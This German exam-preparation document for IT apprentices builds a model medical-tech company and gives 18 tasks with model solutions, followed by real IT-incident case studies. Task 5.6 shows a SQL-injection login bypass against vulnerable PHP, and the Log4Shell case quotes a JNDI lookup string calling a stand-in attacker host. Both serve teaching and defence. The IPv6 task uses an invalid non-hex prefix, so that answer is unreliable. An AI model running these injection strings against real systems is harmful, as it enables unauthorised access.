# 05 – Praxisszenarien, Modellunternehmen & Reale IT-Vorfälle

**Stand:** 15.10.2026 · **Kontext:** fi-lernspiele (Handlungsorientierte Aufgaben für AP1-Vorbereitung)  
**Zielgruppe:** Entwickler, Autoren von Quiz- und Prüfungsmodulen, KI-Agenten in weiteren Chats.

---

## 1. Kurzfazit & Struktur handlungsorientierter AP1-Aufgaben

1. **Prüfungsmuster der IHK:** Echte Prüfungsaufgaben beginnen stets mit einer **Ausgangssituation**: Ein Auszubildender (Fachinformatiker) arbeitet in einem IT-Dienstleistungsbetrieb oder der internen IT-Abteilung eines mittelständischen Unternehmens. Die Aufgaben sind in **Handlungsschritte** unterteilt (z. B. 1. Planung der Netzwerkinfrastruktur, 2. IT-Sicherheit & Datenschutz, 3. Softwareanpassung/SQL).
2. **Keine reinen Wissensabfragen:** In der AP1 wird nicht gefragt „Was ist ein VLAN?“, sondern „Aus Sicherheitsgründen soll die Buchhaltung vom Gäste-WLAN getrennt werden. Konfigurieren Sie den VLAN-Tag und begründen Sie die Wahl des Subnetzes“.
3. **Durchgängiges Modellunternehmen:** Um den Lerntransfer zu maximieren, bettet dieses Dokument alle Aufgaben in die **„MedTech Sanitas GmbH“** ein.

---

## 2. Das Modellunternehmen: „MedTech Sanitas GmbH“

### 2.1 Unternehmenssteckbrief & Organisation
- **Branche:** Vertrieb, Wartung und IT-Vernetzung medizintechnischer Diagnosegeräte (Ultraschall, EKG, digitale Röntgen-/MRT-Gateways) für Arztpraxen und Fachkliniken.
- **Standort:** Hamburg (Zentrale, 2 Etagen Büro + Werkstatt/Labor + Serverraum).
- **Mitarbeiter (gesamt: 45):**
  - Geschäftsleitung & Verwaltung / Personal (10 Mitarbeiter)
  - Vertrieb & Kundenbetreuung (15 Mitarbeiter)
  - Servicetechniker & Werkstattlabor (12 Mitarbeiter im Außen- und Innendienst)
  - Interne IT & RZ-Betrieb (3 Mitarbeiter + 2 Azubis)
  - Empfang & Schulungszentrum (5 Mitarbeiter + bis zu 30 externe Gäste)

---

### 2.2 Netzwerkkonzept & IP-Adressplan (RFC 1918)

- **Zentraler Adressbereich:** `10.42.0.0/16`
- **Internet-Anbindung:** Redundante Glasfaserleitung ($1\text{ GBit/s}$ symmetrisch Primär, $250\text{ MBit/s}$ VDSL Fallback).
- **Core-Switch / Router:** Layer-3-Switching mit Firewall-Routing zwischen den VLANs.

| VLAN-ID | Name / Zweck | Subnetz (CIDR) | Subnetzmaske | Gateway-IP | DHCP-Bereich | Besonderheiten / Regeln |
|---|---|---|---|---|---|---|
| **VLAN 10** | Management | `10.42.10.0/24` | `255.255.255.0` | `10.42.10.1` | Keiner (statisch) | Nur IT-Admins; SSH/HTTPS zu Switches, USV, PDU |
| **VLAN 20** | Server & Storage | `10.42.20.0/24` | `255.255.255.0` | `10.42.20.1` | Statisch / feste Leases | ERP, SQL-Server, Dateiserver, Backup-Target |
| **VLAN 30** | Verwaltung / GF | `10.42.30.0/24` | `255.255.255.0` | `10.42.30.1` | `10.42.30.50–200` | Zugriff auf ERP & Fileserver; kein Zugriff aus Gastnetz |
| **VLAN 40** | Vertrieb & Service | `10.42.40.0/24` | `255.255.255.0` | `10.42.40.1` | `10.42.40.50–200` | VoIP-Telefonie, CRM-Webportal, Internet |
| **VLAN 50** | MedTech-Labor | `10.42.50.0/24` | `255.255.255.0` | `10.42.50.1` | `10.42.50.50–150` | Testgeräte, Mess-PCs, isoliert von Büronetzen |
| **VLAN 90** | Gäste-WLAN | `10.42.90.0/24` | `255.255.255.0` | `10.42.90.1` | `10.42.90.10–250` | **Client Isolation**; nur Internet (HTTP/S, DNS); kein Zugriff auf interne Netze! |
| **DMZ** | Web-Portal / Proxy | `10.42.254.0/28` | `255.255.255.240` | `10.42.254.1` | Statisch | Kunden-Ticketportal, Reverse Proxy, Mail-Relay |

---

### 2.3 Serverraum & Hardware-Ausstattung
- **Rack 1 (Produktion):**
  - 2x Virtualisierungs-Hosts (je 2x 10-GbE SFP+, 128 GB RAM, duale Netzteile).
  - 1x NAS/SAN Storage: 8x 8 TB SAS-Enterprise-Festplatten im **RAID 6** ($6 \times 8 = 48\text{ TB}$ netto, 2 Platten Fehlertoleranz).
  - 1x Managed 48-Port PoE+ Switch (Cat 6A Verkabelung, Patchfeld nach DIN EN 50173).
- **Stromversorgung & Absicherung:**
  - Online-Dauerwandler-USV (**Klasse VFI nach IEC 62040-3**), Scheinleistung $3000\text{ VA}$, Wirkleistung $2700\text{ W}$ ($\cos \varphi = 0{,}9$).
  - Autonome Überbrückungszeit: 25 Minuten bei Vollast.

---

### 2.4 Schutzbedarfsfeststellung nach BSI-Standard 200-2

| IT-System / Geschäftsprozess | Vertraulichkeit (C) | Integrität (I) | Verfügbarkeit (A) | Begründung nach BSI-Standard 200-2 |
|---|---|---|---|---|
| **Patientenbezogene Telemetrie & DICOM-Bilder** | **Sehr Hoch** | **Sehr Hoch** | **Hoch** | Besondere Kategorien personenbezogener Daten (Art. 9 DSGVO). Verfälschung kann Fehldiagnosen auslösen (Gefahr für Leib und Leben!). |
| **Zentraler ERP- & Buchhaltungsserver** | **Hoch** | **Hoch** | **Normal** | GoBD-Compliance, Geschäftsgeheimnisse, Finanzdaten. Kurzer Ausfall bis 4h tolerierbar. |
| **Öffentliches Kunden-Ticketportal (DMZ)** | **Normal** | **Hoch** | **Hoch** | Kundenservice und SLA-Einhaltung. Integrität wichtig gegen Defacement/SQL-Injection. |
| **Gäste-WLAN (Schulungszentrum)** | **Normal** | **Normal** | **Normal** | Reiner Komfort-Dienst ohne Zugriff auf Unternehmenswerte. Ausfall unkritisch. |

---

## 3. 18 Konkrete Praxisszenarien & Prüfungsaufgaben

### Lernfeld 3: Netzwerke & Infrastruktur (6 Aufgaben)

#### Aufgabe 3.1: Subnetting für das Schulungszentrum
- **Situation:** Das Schulungszentrum soll ein eigenes Subnetz erhalten. Vorgabe: Mindestens 58 PCs/Laptops müssen gleichzeitig eine IP erhalten. Der Adressbereich soll aus `172.16.8.0/24` geschnitten werden.
- **Aufgabenstellung:** Ermitteln Sie die kleinstmögliche Subnetzmaske (Präfix und Dotted-Decimal), die Netzadresse, den ersten und letzten nutzbaren Host sowie die Broadcastadresse des ersten Teilnetzes.
- **Musterlösung:**
  - $N_{nutz} \ge 58 \implies 2^h - 2 \ge 58 \implies 2^h \ge 60 \implies h = 6$ Bits ($2^6 = 64$ Adressen, 62 Hosts).
  - Präfix: $32 - 6 = \mathbf{/26}$ $\implies$ Maske `255.255.255.192`.
  - **Netzadresse:** `172.16.8.0/26`
  - **Erster Host:** `172.16.8.1`
  - **Letzter Host:** `172.16.8.62`
  - **Broadcastadresse:** `172.16.8.63`
- **Schwierigkeit:** Mittel · **Typ:** Generator / Freitext

#### Aufgabe 3.2: VLAN-Konfiguration am Switch-Port
- **Situation:** Am Switch-Port 14 soll der PC eines Vertriebsmitarbeiters angeschlossen werden. Am Port 24 ist der Uplink zum Etagenverteiler-Switch angeschlossen.
- **Aufgabenstellung:** Welche Port-Modi (Access vs. Trunk / Tagged vs. Untagged) müssen auf Port 14 und Port 24 für VLAN 40 konfiguriert werden?
- **Musterlösung:**
  - Port 14: **Access-Mode** (Untagged für VLAN 40). Endgeräte verstehen in der Regel keine 802.1Q-Tags und verwerfen getaggte Pakete.
  - Port 24: **Trunk-Mode** (Tagged für alle VLANs, mind. VLAN 40). Multiplexing mehrerer logischer Netze über ein physisches Kabel.
- **Schwierigkeit:** Leicht · **Typ:** Multiple Choice / Drag & Drop

#### Aufgabe 3.3: Datenübertragung & Backup-Fenster
- **Situation:** Ein Vollbackup von $1{,}8\text{ TiB}$ Daten soll über Nacht vom Storage auf das Backup-Tape-System über eine dedizierte $1\text{ GBit/s}$-Verbindung übertragen werden. Wegen Protokolloverhead wird ein Nutzgrad von $92\%$ angenommen.
- **Aufgabenstellung:** Berechnen Sie die Übertragungsdauer in Stunden und Minuten. Reicht ein nächtliches Zeitfenster von 5 Stunden aus?
- **Musterlösung:**
  - $1{,}8\text{ TiB} = 1{,}8 \times 1024^4\text{ Byte} = 1{,}8 \times 1.099.511.627.776\text{ Byte} \approx 1.979.120.929.997\text{ Byte}$.
  - Dateigröße in Bit: $\approx 15.832.967.439.974\text{ Bit}$.
  - Effektive Datenrate: $1.000.000.000\text{ bit/s} \times 0{,}92 = 920.000.000\text{ bit/s}$.
  - Dauer $t = \frac{15.832.967.439.974}{920.000.000} \approx 17.210\text{ Sekunden} \approx 4\text{ Stunden, } 46\text{ Minuten, } 50\text{ Sekunden}$.
  - **Bewertung:** Ja, das Zeitfenster von 5 Stunden reicht knapp aus (Reserve: ca. 13 Minuten).
- **Schwierigkeit:** Schwer · **Typ:** Rechenaufgabe

#### Aufgabe 3.4: Fehlersuche mit Ping und Routing
- **Situation:** Der PC eines Technikers (`10.42.50.77/24`, Gateway `10.42.50.1`) kann den Druckserver (`10.42.20.15/24`) nicht erreichen. Ein `ping 10.42.50.1` ist erfolgreich, ein `ping 10.42.20.15` meldet „Zeitüberschreitung der Anforderung“.
- **Aufgabenstellung:** Nennen Sie drei systematische Ursachen auf Schicht 3/4.
- **Musterlösung:**
  1. Fehlende oder falsche Routing-Einträge auf dem Gateway / L3-Switch zwischen VLAN 50 und VLAN 20.
  2. Firewall-Regel (ACL) blockiert ICMP-Pakete zwischen den VLANs.
  3. Falsch konfiguriertes Standard-Gateway oder aktive lokale Host-Firewall auf dem Druckserver `10.42.20.15`.
- **Schwierigkeit:** Mittel · **Typ:** Freitext

#### Aufgabe 3.5: IPv6 SLAAC und EUI-64
- **Situation:** Ein medizinisches Gateway mit der MAC-Adresse `BC:24:11:9A:88:FE` konfiguriert sich im Präfix `2001:db8:med:50::/64` per SLAAC.
- **Aufgabenstellung:** Bilden Sie die vollständige globale IPv6-Adresse nach dem modifizierten EUI-64-Verfahren und kürzen Sie diese nach RFC 5952.
- **Musterlösung:**
  - MAC trennen und `FF:FE` einfügen: `bc24:11ff:fe9a:88fe`.
  - Invertieren des 7. Bits von `0xbc` (`1011 1100_2` $\to$ `1011 1110_2` = `0xbe`).
  - Interface-ID: `be24:11ff:fe9a:88fe`.
  - Vollständige Adresse: `2001:db8:med:50:be24:11ff:fe9a:88fe`.
- **Schwierigkeit:** Schwer · **Typ:** Generator / Freitext

#### Aufgabe 3.6: Strukturierte Verkabelung nach DIN EN 50173
- **Situation:** Ein neuer Labor-Arbeitsplatz ist $88\text{ m}$ Leitungsweg vom Etagenverteiler entfernt. Der Techniker schlägt vor, am PC ein $15\text{ m}$ langes Patchkabel einzusetzen.
- **Aufgabenstellung:** Beurteilen Sie den Vorschlag nach DIN EN 50173.
- **Musterlösung:**
  - Vorschlag ist **nicht normkonform**.
  - Zwar beträgt die Gesamtlänge $88\text{ m} + 15\text{ m} = 103\text{ m}$ (bereits $> 100\text{ m}$ maximaler Channel).
  - Zudem dürfen flexible Patch- und Gerätekabel in Summe **maximal 10 m** lang sein (höhere Dämpfung als fest verlegtes Verlegekabel).
- **Schwierigkeit:** Leicht · **Typ:** Wahr / Falsch + Begründung

---

### Lernfeld 4: IT-Sicherheit & Schutzbedarf (6 Aufgaben)

#### Aufgabe 4.1: BSI-Schutzbedarfsbegründung
- **Situation:** Das System „Patienten-Telemetrie“ soll bezüglich des Grundwertes **Integrität** eingestuft werden.
- **Aufgabenstellung:** Wählen Sie die Schutzbedarfskategorie (Normal / Hoch / Sehr Hoch) nach BSI 200-2 und formulieren Sie eine schlüssige Begründung.
- **Musterlösung:**
  - **Schutzbedarf: Sehr Hoch.**
  - **Begründung:** Werden Vitalparameter oder Messdaten unbemerkt manipuliert oder fehlerhaft übertragen, drohen falsche Medikationsentscheidungen durch das medizinische Personal. Dies kann unmittelbare Gefahren für Leib und Leben von Patienten nach sich ziehen.
- **Schwierigkeit:** Mittel · **Typ:** Freitext / Einstufung

#### Aufgabe 4.2: Backup-Strategie nach 3-2-1-1-0-Regel
- **Situation:** Die MedTech Sanitas sichert alle Server auf ein zentrales NAS im Serverraum.
- **Aufgabenstellung:** Welche gravierende Schwachstelle liegt vor und wie sieht die Umsetzung der 3-2-1-Regel aus?
- **Musterlösung:**
  - **Schwachstelle:** Lokales Desaster (Brand, Wasser, Diebstahl) oder Ransomware vernichtet Produktivdaten und Backup gleichzeitig (keine Medien- und Standorttrennung).
  - **3-2-1-Regel:**
    - **3** Datenkopien (1 Original + 2 Backups).
    - **2** verschiedene Speichermedien (z. B. SSD/NAS und LTO-Band / Cloud-Object-Storage).
    - **1** Kopie außer Haus (Offsite / anderer Brandabschnitt) bzw. unveränderbar (**Immutable/Air-Gapped**).
- **Schwierigkeit:** Leicht · **Typ:** Multiple Choice

#### Aufgabe 4.3: USV-Dimensionierung & Typenwahl
- **Situation:** Für die beiden Virtualisierungs-Hosts ($2 \times 650\text{ W}$) und den Core-Switch ($180\text{ W}$) soll eine USV beschafft werden. Die Spannungsversorgung im Industriegebiet schwankt häufig und weist Oberschwingungen auf.
- **Aufgabenstellung:** Welcher USV-Typ nach IEC 62040-3 ist zwingend erforderlich und welche Mindest-Scheinleistung muss die USV bei einem Power Factor von $0{,}85$ und $20\%$ Puffer besitzen?
- **Musterlösung:**
  - Typ: **Klasse 1: VFI (Voltage and Frequency Independent) / Online-Dauerwandler**. Bietet unterbrechungsfreie Umschaltzeit ($0\text{ ms}$) und vollständige galvanische/elektronische Entkopplung gegen Netzschwankungen.
  - Leistungsberechnung:
    - $P_{ges} = 2 \times 650\text{ W} + 180\text{ W} = 1480\text{ W}$.
    - $S = \frac{1480\text{ W}}{0{,}85} \approx 1741{,}18\text{ VA}$.
    - Mit 20% Reserve: $1741{,}18 \times 1{,}20 \approx 2089{,}4\text{ VA} \implies$ Mindestens Modellklasse **2200 VA** wählen.
- **Schwierigkeit:** Mittel · **Typ:** Rechenaufgabe

#### Aufgabe 4.4: Datenschutz nach Art. 32 DSGVO (TOMs)
- **Situation:** Außendiensttechniker führen Notebooks mit Kunden- und Servicedaten mit sich.
- **Aufgabenstellung:** Ordnen Sie den folgenden Maßnahmen die korrekte Kategorie der TOMs (Technisch / Organisatorisch) zu:
  1. Vollverschlüsselung der Festplatten mit BitLocker (AES-256).
  2. Dienstanweisung: Notebooks dürfen nicht unbeaufsichtigt im PKW verbleiben.
  3. Einrichtung von 2-Faktor-Authentifizierung (2FA) für VPN-Zugang.
  4. Schulung der Mitarbeiter zur Meldepflicht bei Geräteverlust innerhalb von 72 Stunden (Art. 33 DSGVO).
- **Musterlösung:**
  - 1: Technisch (Verschlüsselung)
  - 2: Organisatorisch (Arbeitsanweisung)
  - 3: Technisch (Zugangskontrolle / Authentisierung)
  - 4: Organisatorisch (Sensibilisierung / Meldeweg)
- **Schwierigkeit:** Leicht · **Typ:** Zuordnungsspiel

#### Aufgabe 4.5: RAID-Auswahl für das Storage-System
- **Situation:** Ein neues Storage-System soll $32\text{ TB}$ Nettokapazität bereitstellen. Es stehen Festplatten zu je $8\text{ TB}$ zur Verfügung. Gefordert ist, dass zwei Festplatten gleichzeitig ausfallen dürfen, ohne dass Daten verloren gehen.
- **Aufgabenstellung:** Welches RAID-Level ist zu wählen und wie viele Festplatten werden mindestens benötigt?
- **Musterlösung:**
  - **RAID 6** (Zweifache verteilte Parität toleriert 2 gleichzeitige Ausfälle).
  - Formel: $K_{netto} = (N - 2) \times S$.
  - $32\text{ TB} = (N - 2) \times 8\text{ TB} \implies N - 2 = 4 \implies N = \mathbf{6\text{ Festplatten}}$.
- **Schwierigkeit:** Mittel · **Typ:** Rechenaufgabe

#### Aufgabe 4.6: Analyse eines Phishing-Vorfalls
- **Situation:** Ein Mitarbeiter der Buchhaltung erhält eine E-Mail: *„Dringend: Ihre M365-Lizenz läuft ab. Klicken Sie hier zur Verifikation: http://login-microsoft-security-auth.net“*. Er gibt seine Zugangsdaten ein.
- **Aufgabenstellung:** Welche drei Sofortmaßnahmen muss die IT einleiten?
- **Musterlösung:**
  1. Sofortige Sperrung des betroffenen Benutzerkontos bzw. Passwort-Reset und Beendigung aller aktiven Anmeldesitzungen (Revoke Tokens).
  2. Überprüfung der Audit-Logs auf verdächtige Logins, Weiterleitungsregeln im Postfach und Datenabflüsse.
  3. Meldung an den betrieblichen Datenschutzbeauftragten zur Prüfung einer Meldepflicht nach Art. 33 DSGVO binnen 72 Stunden.
- **Schwierigkeit:** Leicht · **Typ:** Freitext

---

### Lernfeld 5: Software & Datenbanken / SQL (6 Aufgaben)

*(Verwendet das Datenbankschema `05-modellunternehmen.sql`)*

#### Aufgabe 5.1: Einfache Selektion mit Filter
- **Aufgabenstellung:** Schreiben Sie eine SQL-Abfrage, die alle Kunden (Firma, Ansprechpartner, Telefon) auflistet, die ihren Sitz in „Hamburg“ haben, alphabetisch sortiert nach der Firma.
- **Musterlösung:**
  ```sql
  SELECT firma, ansprechpartner, telefon
  FROM kunde
  WHERE stadt = 'Hamburg'
  ORDER BY firma ASC;
  ```
- **Schwierigkeit:** Leicht · **Typ:** SQL-Editor

#### Aufgabe 5.2: Inner Join über Geräte und Kunden
- **Aufgabenstellung:** Ermitteln Sie Seriennummer und Modell aller Geräte sowie den Firmennamen des Kunden, für alle Geräte, die nach dem 01.01.2024 gekauft wurden.
- **Musterlösung:**
  ```sql
  SELECT g.seriennummer, g.modell, k.firma
  FROM geraet g
  JOIN kunde k ON g.kunden_id = k.kunden_id
  WHERE g.kaufdatum > '2024-01-01';
  ```
- **Schwierigkeit:** Leicht–Mittel · **Typ:** SQL-Editor

#### Aufgabe 5.3: Aggregation & Gruppierung (HAVING)
- **Aufgabenstellung:** Ermitteln Sie für jeden Kunden die Anzahl der gemeldeten Tickets. Es sollen nur Kunden ausgegeben werden, die mehr als 1 Ticket haben.
- **Musterlösung:**
  ```sql
  SELECT k.firma, COUNT(t.ticket_id) AS anzahl_tickets
  FROM kunde k
  JOIN geraet g ON k.kunden_id = g.kunden_id
  JOIN ticket t ON g.geraet_id = t.geraet_id
  GROUP BY k.kunden_id, k.firma
  HAVING COUNT(t.ticket_id) > 1;
  ```
- **Schwierigkeit:** Mittel · **Typ:** SQL-Editor

#### Aufgabe 5.4: Left Join & Erkennung von NULL-Werten
- **Aufgabenstellung:** Finden Sie alle Tickets, denen aktuell **noch kein Techniker** zugewiesen wurde. Geben Sie die Ticket-ID, den Titel und den Status aus.
- **Musterlösung:**
  ```sql
  SELECT ticket_id, titel, status
  FROM ticket
  WHERE techniker_id IS NULL;
  ```
  *(Typischer Fehler der Azubis: `= NULL` statt `IS NULL`)*
- **Schwierigkeit:** Leicht · **Typ:** Multiple Choice / Fehlersuche

#### Aufgabe 5.5: Normalisierung (1NF bis 3NF)
- **Situation:** Ein Entwickler schlägt folgende unnormalisierte Tabelle vor:  
  `Tabelle (KundenID, Firmenname, GeraeteSeriennummern_kommagetrennt, TechnikerTelefon)`
- **Aufgabenstellung:** Erläutern Sie, gegen welche Normalform verstoßen wird und wie die 1. und 3. Normalform hergestellt werden.
- **Musterlösung:**
  - Verstoß gegen **1NF:** Mehrere Werte in einem Feld (`GeraeteSeriennummern_kommagetrennt`) sind nicht atomar.
  - Verstoß gegen **3NF:** `TechnikerTelefon` hängt transitiv vom Techniker ab, nicht direkt vom Kunden-Primärschlüssel.
  - **Lösung:** Atomisierung der Attribute in Einzelfelder; Auslagerung in separate Entitäten `geraet` und `techniker` mit Fremdschlüsseln.
- **Schwierigkeit:** Mittel · **Typ:** Freitext

#### Aufgabe 5.6: SQL-Injection & Prepared Statements
- **Situation:** Ein Login-Formular führt folgenden PHP-Code aus:  
  `$query = "SELECT * FROM users WHERE user = '" . $_POST['user'] . "' AND pass = '" . $_POST['pass'] . "';";`
- **Aufgabenstellung:** Zeigen Sie eine beispielhafte Eingabe für das Feld `user`, die das Kennwort umgeht, und schreiben Sie das sichere Pendant mittels Prepared Statement.
- **Musterlösung:**
  - Schad-Eingabe: `' OR '1'='1' -- `
  - Sichere Implementierung:
    ```sql
    -- Parameter-Binding mit Platzhaltern
    SELECT * FROM users WHERE user = ? AND pass_hash = ?;
    ```
- **Schwierigkeit:** Mittel · **Typ:** Code-Audit

---

## 4. Reale IT-Sicherheitsvorfälle als Fallstudien für LF04

### Vorfall 1: Kammergericht Berlin (September 2019)
- **Datum / Zeitraum:** September 2019 – monatelanger Totalausfall.
- **Angriffsvektor:** Infektion mit dem Banking-Trojaner / Malware-Dropper **Emotet** über Phishing-Mails mit makro-basierten Word-Dateien. Nachladen von TrickBot und Ryuk-Ransomware.
- **Auswirkungen:** Vollständige Trennung des gesamten Berliner Justiznetzes vom Landesnetz. Rückfall auf Fax, Papier und Telefon für fast ein Jahr. Das IT-Netzwerk musste komplett neu aufgebaut werden.
- **Didaktischer Lernbezug (LF04):**
  - Bedeutung von Makro-Sperren in Microsoft Office.
  - E-Mail-Filterung (Sender Policy Framework / SPF, DKIM, DMARC).
  - Netzsegmentierung: Trennung administrativer Systeme vom Office-Netz.

---

### Vorfall 2: Universitätsklinikum Düsseldorf (September 2020)
- **Datum / Zeitraum:** 10. September 2020.
- **Angriffsvektor:** Ausnutzung einer bekannten, aber ungepatchten Schwachstelle in **Citrix ADC / Gateway (CVE-2019-19781 „Shitrix“)**. Nachfolgende Verschlüsselung von 30 Servern durch Ransomware.
- **Auswirkungen:** Vollständige Abmeldung von der Notfallversorgung für 13 Tage. Eine Notfallpatientin musste in das 30 km entfernte Wuppertal verlegt werden und verstarb dort (Ermittlungsverfahren wegen fahrlässiger Tötung, das mangels direktem Kausalnachweis eingestellt wurde).
- **Didaktischer Lernbezug (LF04):**
  - **Patch-Management:** Sicherheitsrelevante Patches für internetexponierte Systeme müssen ohne Verzögerung eingespielt werden.
  - Schwachstellen-Scanning & Angriffsflächen-Reduzierung (Attack Surface Reduction).
  - Notfallpläne und Ausweichkonzepte für KRITIS-Einrichtungen (BSI IT-Grundschutz BSI-Standard 200-4 Business Continuity Management).

---

### Vorfall 3: Landkreis Anhalt-Bitterfeld (Juli 2021)
- **Datum / Zeitraum:** 6. Juli 2021.
- **Besonderheit:** **Erster offizieller IT-Katastrophenfall** der Bundesrepublik Deutschland.
- **Angriffsvektor:** Ransomware-Bande (Babuk Locker). Zugriff über kompromittierte Zugangsdaten und laterale Bewegung im flachen, unsegmentierten Netz.
- **Auswirkungen:** Bürgerbüros, Elterngeld- und Sozialhilfeauszahlungen sowie Kfz-Zulassungen standen über 6 Monate still. Schadenshöhe im zweistelligen Millionenbereich.
- **Didaktischer Lernbezug (LF04):**
  - **Netzwerksegmentierung (VLANs & Firewalls):** Ein befallenes System darf nicht die gesamte Kommunalverwaltung infizieren.
  - Privileged Access Management (PAM) und Prinzip der geringsten Rechte (Least Privilege).
  - Offline-/Air-Gapped-Backups.

---

### Vorfall 4: Log4Shell / Apache Log4j (Dezember 2021)
- **Schwachstelle:** CVE-2021-44228 in der weit verbreiteten Java-Logging-Bibliothek Log4j (CVSS-Score **10.0 – Maximal bedrohlich**).
- **Ursache:** JNDI-Lookup-Funktionalität (`${jndi:ldap://evil.com/a}`) in unbereinigten Log-Strings führte zur Remote Code Execution (RCE).
- **Auswirkungen:** Weltweite Notfall-Alarmstufe Rot des BSI. Millionen Server, Router und Cloud-Dienste betroffen.
- **Didaktischer Lernbezug (LF04/LF05):**
  - **OWASP A06: Software-Lieferkette (Supply Chain Security) & Software Bill of Materials (SBOM)**.
  - Eingabevalidierung und Sanitization: Benutzereingaben dürfen niemals ungeprüft an Parser oder Ausführungsumgebungen weitergeleitet werden.

---

### Vorfall 5: CrowdStrike Falcon Sensor Outage (19. Juli 2024)
- **Datum:** 19. Juli 2024.
- **Ursache:** Kein Cyberangriff, sondern ein **fehlerhaftes Update** einer Konfigurationsdatei („Channel File 291“) für den CrowdStrike Falcon Sensor Kernel-Treiber (`csagent.sys`).
- **Folgen:** Weltweit stürzten ca. **8,5 Millionen Windows-Rechner** mit Blue Screens of Death (BSOD – Bugcheck 0x50 `PAGE_FAULT_IN_NONPAGED_AREA`) in eine Endlos-Bootschleife. Flughäfen fielen weltweit aus, Operationen in Krankenhäusern mussten abgesagt werden, Banküberweisungen stockten.
- **Behebung:** Manueller Start jedes einzelnen betroffenen Rechners in den abgesicherten Modus (Safe Mode) oder WinRE mit BitLocker-Wiederherstellungsschlüssel, um die defekte `.sys`-Datei händisch zu löschen.
- **Didaktischer Lernbezug (LF02, LF03, LF04):**
  - **Staging & Phased Rollout:** Treiber- und Sicherheitsupdates dürfen niemals simultan an 100% aller weltweiten Systeme ausgerollt werden (Ring-Deployment: Test $\to$ Pilot $\to$ Produktion).
  - **BitLocker-Schlüsselverwaltung:** Notwendigkeit einer zentralen, offline verfügbaren Dokumentation von Wiederherstellungsschlüsseln.
  - **Gefahren von Kernel-Level-Software:** Ein Fehler im Kernel-Space (Ring 0) reißt das gesamte Betriebssystem mit.
